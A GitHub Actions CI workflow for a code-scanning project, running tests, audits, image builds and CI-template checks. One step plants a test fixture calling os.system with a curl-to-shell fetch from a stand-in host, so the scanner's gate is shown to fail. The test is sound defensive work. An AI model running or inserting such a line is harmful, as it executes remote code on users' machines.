name: CI

on:
  # Manual trigger — click "Run workflow" in GitHub Actions tab
  workflow_dispatch:
  # Auto-run on pushes to main
  push:
    branches: [main]
  # Auto-run on PRs targeting main
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  backend:
    name: Backend (lint + test)
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: agentgraph_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      redis:
        image: redis:7
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python 3.12
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: pip install -e ".[prod,dev]"

      - name: Lint
        run: ruff check src/ tests/

      - name: AST verify
        run: |
          find src tests -name "*.py" -exec python -c "
          import ast, sys
          ast.parse(open(sys.argv[1]).read())
          print('OK:', sys.argv[1])
          " {} \;

      - name: Run migrations
        env:
          DATABASE_URL: postgresql+asyncpg://postgres:postgres@localhost:5432/agentgraph_test
        run: alembic upgrade head

      - name: Test
        env:
          DATABASE_URL: postgresql+asyncpg://postgres:postgres@localhost:5432/agentgraph_test
          REDIS_URL: redis://localhost:6379/0
          # .env is no longer tracked (004fc83), so CI has to opt into debug itself:
          # without it settings refuse the default JWT_SECRET and every module errors.
          DEBUG: "true"
        run: pytest tests/ -v

  frontend:
    name: Frontend (typecheck + build)
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"
          cache-dependency-path: web/package-lock.json

      - name: Install dependencies
        working-directory: web
        run: npm ci

      - name: TypeScript check
        working-directory: web
        run: npx tsc -b

      - name: Build
        working-directory: web
        run: npx vite build

  rugpull-demo:
    name: JS gate + rug-pull demo (localhost, no network after install)
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python 3.12
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install backend (the demo grades with the real scanner)
        run: pip install -e ".[prod]"

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "22"

      - name: JS gate tests
        working-directory: sdk/js
        run: npm ci && npm test

      - name: Rug-pull demo test
        working-directory: demos/rugpull
        env:
          DEBUG: "true"
          PYTHON: python
        run: npm ci --omit=optional && npm test

  security:
    name: Security Scanning
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python 3.12
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: pip install -e ".[prod,dev]" pip-audit

      - name: Audit Python dependencies
        run: pip-audit || true
        # pip-audit runs for visibility; vulnerabilities are tracked
        # in dependency update PRs rather than blocking every commit

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"
          cache-dependency-path: web/package-lock.json

      - name: Audit npm dependencies
        run: cd web && npm ci && npm audit --audit-level=high || true

  docker:
    name: Docker Image Build (verify only)
    runs-on: ubuntu-latest
    needs: [backend, frontend]
    if: github.event_name == 'push'

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build backend image (no push)
        uses: docker/build-push-action@v5
        with:
          context: .
          file: Dockerfile
          push: false
          tags: agentgraph/backend:${{ github.sha }}

      - name: Build frontend image (no push)
        uses: docker/build-push-action@v5
        with:
          context: web
          file: web/Dockerfile
          push: false
          tags: agentgraph/frontend:${{ github.sha }}

      # The slim CI scanner image (gitlab/ component, ghcr.io/agentavow/scanner).
      # Built and smoke-run on this checkout so a src/ change that breaks its
      # import closure is caught here; not pushed.
      - name: Build scanner image (no push)
        uses: docker/build-push-action@v5
        with:
          context: .
          file: docker/scanner.Dockerfile
          push: false
          load: true
          tags: agentavow/scanner:${{ github.sha }}

      - name: Smoke-test scanner image on this checkout
        run: |
          docker run --rm -v "$PWD:/src" agentavow/scanner:${{ github.sha }} \
            agentavow scan . --json /src/agentavow-scan.json \
            --gitlab-code-quality /src/gl-code-quality-report.json
          python3 -c "import json; d=json.load(open('agentavow-scan.json')); print(d['verdict_phrase'], d['trust_score'])"
          test -s gl-code-quality-report.json
          docker image inspect agentavow/scanner:${{ github.sha }} --format 'scanner image: {{.Size}} bytes'

  # The Bitbucket pipe and the Azure Pipelines template, run for real against the
  # scanner image built from this checkout (on PRs too, unlike the docker job).
  ci-templates:
    name: Bitbucket + Azure CI templates (scanner image)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build scanner image
        run: docker build -q -f docker/scanner.Dockerfile -t agentavow/scanner:ci .
      - name: Bitbucket wrapper in the scanner image (step `image:` form)
        run: |
          docker run --rm -v "$PWD:/repo" -w /repo \
            -e BITBUCKET_CLONE_DIR=/repo -e BITBUCKET_REPO_SLUG=agentavow \
            -e CODE_INSIGHTS=false -e FAIL_ON=none \
            agentavow/scanner:ci agentavow-bitbucket
          python3 -c "import json; d=json.load(open('agentavow-scan.json')); print(d['verdict_phrase'], d['trust_score'])"
          python3 -c "import json; d=json.load(open('agentavow-insights.json')); assert d['report']['report_type']=='SECURITY'; print(len(d['annotations']), 'annotations')"
          head -5 agentavow-summary.md
          sudo rm -f agentavow-scan.json agentavow-insights.json agentavow-summary.md
      - name: Bitbucket pipe image (entrypoint form)
        run: |
          docker build -q -f bitbucket/Dockerfile --build-arg SCANNER_IMAGE=agentavow/scanner:ci \
            -t agentavow/scanner:pipe-ci bitbucket
          docker run --rm -v "$PWD:/opt/atlassian/pipelines/agent/build" \
            -e BITBUCKET_CLONE_DIR=/opt/atlassian/pipelines/agent/build \
            -e CODE_INSIGHTS=false -e FAIL_ON=none -e SCAN_PATHS="src/scanner docs" \
            agentavow/scanner:pipe-ci
          test -s agentavow-scan-src-scanner.json && test -s agentavow-summary-docs.md
          sudo rm -f agentavow-*.json agentavow-*.md
      - name: Azure template scan step
        run: |
          pip install -q pyyaml
          python3 scripts/ci/run_azure_template.py --image agentavow/scanner:ci \
            --sources "$PWD" --temp "$RUNNER_TEMP" --fail-on none
          test -s "$RUNNER_TEMP/agentavow/agentavow-summary.md"
          test -s "$RUNNER_TEMP/agentavow/agentavow.sarif"
          head -3 "$RUNNER_TEMP/agentavow/agentavow-summary.md"
      - name: Azure template gate fails on Do not connect
        run: |
          mkdir -p /tmp/bad && cd /tmp/bad && git init -q
          printf 'import os\n\ndef run(c):\n    os.system("curl http://x.example/i.sh | sh")\n' > app.py
          git add -A && git -c user.email=t@t -c user.name=t commit -qm x
          cd "$GITHUB_WORKSPACE"
          if python3 scripts/ci/run_azure_template.py --image agentavow/scanner:ci \
               --sources /tmp/bad --temp "$RUNNER_TEMP/bad"; then
            echo "expected the gate to fail"; exit 1
          fi
          grep -q "Do not connect" "$RUNNER_TEMP/bad/agentavow/agentavow-summary.md"

  # Publish the slim scanner image so the GitLab component (gitlab/templates/scan.yml,
  # default image ghcr.io/agentavow/scanner:0.1) is pullable without building it.
  # Only on pushes to main, only after the smoke test above passed.
  scanner-image:
    name: Publish scanner image (ghcr.io/agentavow/scanner)
    runs-on: ubuntu-latest
    needs: [docker]
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      - name: Log in to ghcr.io
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          file: docker/scanner.Dockerfile
          push: true
          tags: |
            ghcr.io/agentavow/scanner:0.1
            ghcr.io/agentavow/scanner:latest
            ghcr.io/agentavow/scanner:sha-${{ github.sha }}
          labels: |
            org.opencontainers.image.source=https://github.com/AgentAvow/AgentAvow
            org.opencontainers.image.description=AgentAvow slim scanner (agentavow scan) for CI
            org.opencontainers.image.licenses=MIT
      # The Bitbucket pipe (bitbucket/pipe.yml): the scanner image plus an entrypoint.
      # Published as tags of the same public package so it pulls anonymously.
      - name: Build and push Bitbucket pipe
        uses: docker/build-push-action@v5
        with:
          context: bitbucket
          file: bitbucket/Dockerfile
          push: true
          build-args: |
            SCANNER_IMAGE=ghcr.io/agentavow/scanner:sha-${{ github.sha }}
          tags: |
            ghcr.io/agentavow/scanner:pipe-0.1
            ghcr.io/agentavow/scanner:pipe-sha-${{ github.sha }}
          labels: |
            org.opencontainers.image.source=https://github.com/AgentAvow/AgentAvow
            org.opencontainers.image.description=AgentAvow scan as a Bitbucket Pipe
            org.opencontainers.image.licenses=MIT
